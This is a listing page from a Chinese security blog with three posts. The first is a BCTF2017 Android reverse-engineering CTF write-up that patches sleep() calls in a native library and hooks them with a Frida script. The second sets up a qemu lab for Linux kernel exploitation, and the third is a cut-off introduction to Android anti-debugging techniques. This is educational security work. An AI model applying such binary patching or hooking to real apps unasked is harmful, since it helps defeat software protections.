<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="BruceFan&#39;s Blog">
<meta property="og:url" content="http://example.com/page/8/index.html">
<meta property="og:site_name" content="BruceFan&#39;s Blog">
<meta property="og:locale">
<meta property="article:author" content="Bruce Fan">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/8/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-Hans'
  };
</script>

  <title>BruceFan's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">BruceFan's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Stay hungry, stay foolish</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/04/17/BCTF2017-re2-apk-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/04/17/BCTF2017-re2-apk-Writeup/" class="post-title-link" itemprop="url">BCTF2017 re2.apk Writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-04-17 14:17:15" itemprop="dateCreated datePublished" datetime="2017-04-17T14:17:15+08:00">2017-04-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>题目下载：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1gfMeJSZ">re2.apk</a><br>关于Android Studio的使用一直不太熟悉，借着题目学习一下。<br>这里是Android Studio中<a target="_blank" rel="noopener" href="https://developer.android.com/studio/projects/add-native-code.html">NDK开发</a>的官方文档。<br>将APK文件用JEB打开：<br><img src="/images/bctf2017/jebmain.png"><br>MainActivity中有这么一些代码，代码并不复杂，也没有混淆加密，逻辑大概是：有两个按钮，需要轮流点这两个按钮，奇数次点pong，偶数次点ping，总共要点100万次。还有一个关键是调用了<code>pp</code>库，每次点击按钮会调用库中的<code>ping()</code>和<code>pong()</code>函数。<br>解决思路：新建一个项目，是通过编写代码，模拟点击，调用这两个库函数。<br>代码如下：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.geekerchina.pingpongmachine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;pp&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ttt = <span class="number">1000000</span>;</span><br><span class="line">        <span class="keyword">int</span> tt = ttt;</span><br><span class="line">        <span class="keyword">while</span> (tt != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tt % <span class="number">2</span> == <span class="number">0</span>) &#123; <span class="comment">// 偶数次点ping</span></span><br><span class="line">                --tt;</span><br><span class="line">                p = ping(p, num);</span><br><span class="line">                ++num;</span><br><span class="line">                <span class="keyword">if</span> (num &gt;= <span class="number">7</span>) num = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (tt == <span class="number">0</span>) Log.d(<span class="string">&quot;FLAG:&quot;</span>, <span class="string">&quot;BCTF&#123;MagicNum&quot;</span>+Integer.toString(p)+<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 奇数次点pong</span></span><br><span class="line">                --tt;</span><br><span class="line">                p = pong(p, num);</span><br><span class="line">                ++num;</span><br><span class="line">                <span class="keyword">if</span> (num &gt;= <span class="number">7</span>) num = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (tt == <span class="number">0</span>) Log.d(<span class="string">&quot;FLAG:&quot;</span>, <span class="string">&quot;BCTF&#123;MagicNum&quot;</span>+Integer.toString(p)+<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">ping</span><span class="params">(<span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">pong</span><span class="params">(<span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意的是项目的包名要与题目中的一致。<br>项目的关键向Android Studio中添加so文件，这里卡了好久，网上找了好多文章，没有一个成功的，真的不如eclipse方便。<br>后来不经意看到别人项目中的gradle文件内容才解决。<br>在<code>src/main</code>下添加<code>jniLibs/armeabi/xxx.so</code><br>删除<code>build.gradle</code>中的  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">externalNativeBuild &#123;</span><br><span class="line">    cmake &#123;</span><br><span class="line">        path &quot;CMakeLists.txt&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>build.gradle</code>完整的配置如下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">apply plugin: &#39;com.android.application&#39;</span><br><span class="line"></span><br><span class="line">android &#123;</span><br><span class="line">    compileSdkVersion 24</span><br><span class="line">    buildToolsVersion &quot;25.0.2&quot;</span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId &quot;com.geekerchina.pingpongmachine&quot;</span><br><span class="line">        minSdkVersion 19</span><br><span class="line">        targetSdkVersion 24</span><br><span class="line">        versionCode 1</span><br><span class="line">        versionName &quot;1.0&quot;</span><br><span class="line">        testInstrumentationRunner &quot;android.support.test.runner.AndroidJUnitRunner&quot;</span><br><span class="line">        externalNativeBuild &#123;</span><br><span class="line">            cmake &#123;</span><br><span class="line">                cppFlags &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        release &#123;</span><br><span class="line">            minifyEnabled false</span><br><span class="line">            proguardFiles getDefaultProguardFile(&#39;proguard-android.txt&#39;), &#39;proguard-rules.pro&#39;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dependencies &#123;</span><br><span class="line">    compile fileTree(dir: &#39;libs&#39;, include: [&#39;*.jar&#39;])</span><br><span class="line">    androidTestCompile(&#39;com.android.support.test.espresso:espresso-core:2.2.2&#39;, &#123;</span><br><span class="line">        exclude group: &#39;com.android.support&#39;, module: &#39;support-annotations&#39;</span><br><span class="line">    &#125;)</span><br><span class="line">    compile &#39;com.android.support.constraint:constraint-layout:1.0.2&#39;</span><br><span class="line">    testCompile &#39;junit:junit:4.12&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从题目中解压出so文件放到自己创建的项目中（so库也没有加密或做其他处理，能够直接调用），运行程序，好长时间都没有结果。这时逆向so文件或在每次”点击”中加一个Log都行，我在”点击”中加了  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Log.d(<span class="string">&quot;pingpong&quot;</span>, <span class="string">&quot;tt:&quot;</span>+Integer.toString(tt))</span><br></pre></td></tr></table></figure>
<p>监控tt的变化，发现Log打得很慢。用IDA打开so文件，发现<code>ping()</code>和<code>pong()</code>函数中都有一个<code>sleep(1)</code>函数，只要NOP掉这个sleep就可以了。这里我犯了一个错误，sleep(1)对应的机器码是32位，我就改成mov r0, r0对应的ARM机器码<code>00 00 A0 E1</code>了，结果程序运行不了。<br><img src="/images/bctf2017/thumb.png"><br>其实这段代码对应的是Thumb指令，应该改成mov r0, r0对应的Thumb机器码，查机器码时我用的radare2的rasm2：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ rasm2 -a arm -b 16 &#39;mov r0, r0&#39;</span><br><span class="line">0046</span><br></pre></td></tr></table></figure>
<p>将sleep(1)的机器码改成<code>00 46 00 46</code>，即两条mov r0, r0指令。将修改后的so文件放到项目中，再次运行项目：<br><img src="/images/bctf2017/flag.png"><br>最终得到FLAG: BCTF{MagicNum4500009}  </p>
<p><strong>补充：</strong><br>最近看了一些Frida的用法，想自己用Frida解决一些问题，就选了以前做过的题目试试。之前用的patch的方法，这里借用来学一下Frida方法。<br>和上面一样，还是需要新建一个项目调用libpp.so，不过libpp.so不需要patch。<br>新建一个Frida脚本，hook so文件中调用的sleep函数，替换为自己的实现：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] Starting script&quot;</span>);</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> sleepPtr = <span class="literal">undefined</span>;</span><br><span class="line">        imports = Module.enumerateImportsSync(<span class="string">&#x27;libpp.so&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; imports.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (imports[i].name == <span class="string">&quot;sleep&quot;</span>) &#123;</span><br><span class="line">                sleepPtr = imports[i].address;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;[*] sleepPtr = &quot;</span> + sleepPtr);</span><br><span class="line">        <span class="keyword">var</span> sleep = <span class="keyword">new</span> NativeFunction(sleepPtr, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line">        <span class="comment">// t是so文件中调用时的实际参数</span></span><br><span class="line">        Interceptor.replace(sleepPtr, <span class="keyword">new</span> NativeCallback(<span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> ret = sleep(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这里将so文件中的sleep调用替换为了sleep(0)，达到的效果和patch是一样的。  </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/04/17/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/04/17/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" class="post-title-link" itemprop="url">Linux内核漏洞利用（一）环境配置</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-04-17 10:13:22" itemprop="dateCreated datePublished" datetime="2017-04-17T10:13:22+08:00">2017-04-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>我的实验环境是:</p>
<ul>
<li>Ubuntu 12.04 x86</li>
<li>qemu</li>
<li>linux-2.6.32</li>
<li>busybox 1.19.4</li>
</ul>
<h2 id="安装qemu"><a href="#安装qemu" class="headerlink" title="安装qemu"></a>安装qemu</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install qemu qemu-system</span><br></pre></td></tr></table></figure>

<h2 id="Linux内核编译"><a href="#Linux内核编译" class="headerlink" title="Linux内核编译"></a>Linux内核编译</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;www.kernel.org&#x2F;pub&#x2F;linux&#x2F;kernel&#x2F;v2.6&#x2F;linux-2.6.32.tar.gz</span><br><span class="line">$ tar zxvf linux-2.6.32.tar.gz</span><br><span class="line">$ cd linux-2.6.32&#x2F;</span><br><span class="line">$ sudo apt-get install libncurses5-dev</span><br><span class="line">$ make menuconfig</span><br><span class="line">$ make</span><br><span class="line">$ make all</span><br><span class="line">$ make modules</span><br></pre></td></tr></table></figure>
<p>编译过程中可能出现一些问题，主要是因为gdb版本不同，建议先进行修改再进行编译，可以省很多时间。<br>修改：<br>1.在内核目录arch/x86/vdso/Makefile中，大约在28,29行 找到 VDSO_LDFLAGS_vdso.lds = -m elf_x86_64 -Wl,-soname=linux-vdso.so.1 \   -Wl,-z,max-page-size=4096 -Wl,-z,common-page-size=4096 把”-m elf_x86_64” 替换为 “-m64”<br>2.然后再继续找，大约在72行左右，找到VDSO_LDFLAGS_vdso32.lds = -m elf_i386 -Wl,-soname=linux-gate.so.1中的 “-m elf_i386” 替换为 “-m32”<br>3.打开文件drivers/net/igbvf/igbvf.h，看128行，代码为：struct page *page;再往上看，第123行，也有struct page *page;这行代码，这个结构定义在内部的一个结构体中。就是他的名字与128行的重复了，而4.6.3的编译器对不支持这种方式的定义，将128行的代码注释掉。</p>
<h2 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cd ..</span><br><span class="line">$ wget https:&#x2F;&#x2F;busybox.net&#x2F;downloads&#x2F;busybox-1.19.4.tar.bz2</span><br><span class="line">$ tar -jxvf busybox-1.19.4.tar.bz2</span><br><span class="line">$ cd busybox-1.19.4</span><br><span class="line">$ make menuconfig # Busybox Settings -&gt; Build Options -&gt; Build Busybox as a static binary</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure>
<p>编译出错  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make: *** [busybox_unstripped] Error1</span><br></pre></td></tr></table></figure>
<p>make menuconfig去掉如下选项<br>Linux System Utilities -&gt; [] Support mounting NFS file system 网络文件系统<br>Networking Utilities -&gt; [] inetd (Internet超级服务器)<br>编译成功后做如下配置：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cd _install</span><br><span class="line">$ mkdir proc sys dev etc etc&#x2F;init.d</span><br><span class="line">$ vim etc&#x2F;init.d&#x2F;rcS</span><br><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">mount -t proc none &#x2F;proc</span><br><span class="line">mount -t sysfs none &#x2F;sys</span><br><span class="line">&#x2F;sbin&#x2F;mdev -s</span><br><span class="line">$ chmod +x etc&#x2F;init.d&#x2F;rcS</span><br><span class="line">$ find . | cpio -o --format&#x3D;newc &gt; ..&#x2F;rootfs.img</span><br><span class="line">$ cd ..&#x2F;..&#x2F;linux-2.6.32</span><br><span class="line">$ qemu-system-i386 -kernel arch&#x2F;i386&#x2F;boot&#x2F;bzImage -initrd ..&#x2F;busybox-1.19.4&#x2F;rootfs.img -append &quot;root&#x3D;&#x2F;dev&#x2F;ram rdinit&#x3D;&#x2F;sbin&#x2F;init&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/images/linuxkernel/qemu-kernel.png">  </p>
<p><strong>8.18补充</strong><br>最近又发现了一些qemu的使用姿势：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">qemu-system-i386 -m 128M -kernel linux-2.6.32&#x2F;arch&#x2F;i386&#x2F;boot&#x2F;bzImage -initrd busybox-1.19.4&#x2F;rootfs.img -append &quot;console&#x3D;ttyS0 root&#x3D;&#x2F;dev&#x2F;ram rdinit&#x3D;&#x2F;sbin&#x2F;init&quot; --nographic -s</span><br></pre></td></tr></table></figure>
<p>将上述内容保存到boot.sh文件，添加可执行权限，<code>./boot.sh</code>即可启动内核。其中<code>-m</code>是指定RAM大小（默认384）；<code>--nographic</code>和<code>console=ttyS0</code>一起使用，启动的界面就变成当前终端；<code>-s</code>相当于<code>-gdb tcp::1234</code>的简写，可以直接通过主机的gdb远程连接。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3700.html">http://bobao.360.cn/learning/detail/3700.html</a><br><a target="_blank" rel="noopener" href="https://github.com/surajx/qemu-arm-linux/wiki/Compile-Linux,-BusyBox-for-ARM-and-load-it-using-QEMU">https://github.com/surajx/qemu-arm-linux/wiki/Compile-Linux,-BusyBox-for-ARM-and-load-it-using-QEMU</a><br><a target="_blank" rel="noopener" href="http://8happyer.blog.163.com/blog/static/96453662012263536678/">http://8happyer.blog.163.com/blog/static/96453662012263536678/</a>  </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/04/15/Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8F%8D%E8%B0%83%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/04/15/Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8F%8D%E8%B0%83%E8%AF%95/" class="post-title-link" itemprop="url">Android逆向之反调试</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-04-15 00:08:37" itemprop="dateCreated datePublished" datetime="2017-04-15T00:08:37+08:00">2017-04-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>为了防止通过调试将内存中的DEX文件dump出来，APP一般都会采用各种反调试来进行保护，这篇文章主要对常见的一些反调试技术进行介绍。</p>
<h2 id="ptrace自身或子进程相互ptrace"><a href="#ptrace自身或子进程相互ptrace" class="headerlink" title="ptrace自身或子进程相互ptrace"></a>ptrace自身或子进程相互ptrace</h2><p>代码非常简单，在JNI_Onload最开始加上这个函数即可：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">anti_ptrace</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中PTRACE_TRACEME代表：本进程被自身进程ptrace。一般一个进程只能被附加一次，如果应用已被自身进程附加，后面的调试附加就会失败。</p>
<h2 id="检查调试状态"><a href="#检查调试状态" class="headerlink" title="检查调试状态"></a>检查调试状态</h2><p>这种方式是通过Android中的API进行检验，有两种方法：<br><strong>检查应用是否属于debug模式</strong><br>调用Android中的flag属性：<code>ApplicationInfo.FLAG_DEBUGGABLE</code>，判断是否属于debug模式：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isDebuggable</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (context.getApplicationInfo().flags &amp; ApplicationInfo.FLAG_DEBUGGABLE) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
